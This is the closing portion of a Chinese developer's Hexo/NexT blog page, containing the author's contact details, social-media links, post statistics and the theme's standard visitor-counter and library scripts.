<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#x63;&#111;&#100;&#x65;&#114;&#x66;&#x69;&#115;&#104;&#64;&#x31;&#x36;&#51;&#x2e;&#99;&#111;&#x6d;">&#x63;&#111;&#100;&#x65;&#114;&#x66;&#x69;&#115;&#104;&#64;&#x31;&#x36;&#51;&#x2e;&#99;&#111;&#x6d;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/uploads/avatar.jpg"
               alt="小鱼" />
          <p class="site-author-name" itemprop="name">小鱼</p>
          <p class="site-description motion-element" itemprop="description">技术宅 iOS开发 JAVA开发 萌妹子</p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">42</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">5</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">5</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/summertian4" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  GitHub
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/coderfish" target="_blank" title="微博">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                  微博
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://www.zhihu.com/people/coderfish" target="_blank" title="知乎">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  知乎
                </a>
              </span>
            
          
        </div>

        
        

        
        

      </section>

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

<div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2016</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">小鱼</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Muse
  </a>
</div>

<span id="busuanzi_container_site_pv">
    | 本站总访问量<span id="busuanzi_value_site_pv"></span>次 (统计起始日期:2016年8月4日)
</span>
        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  
  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>



  



  




  
  

  

  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>AV.initialize("PI8DkEcwwAeUsSvTJirjB4NY-gzGzoHsz", "F82ePXFzAey9dKSBAFdoB6ka");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

</body>
</html>
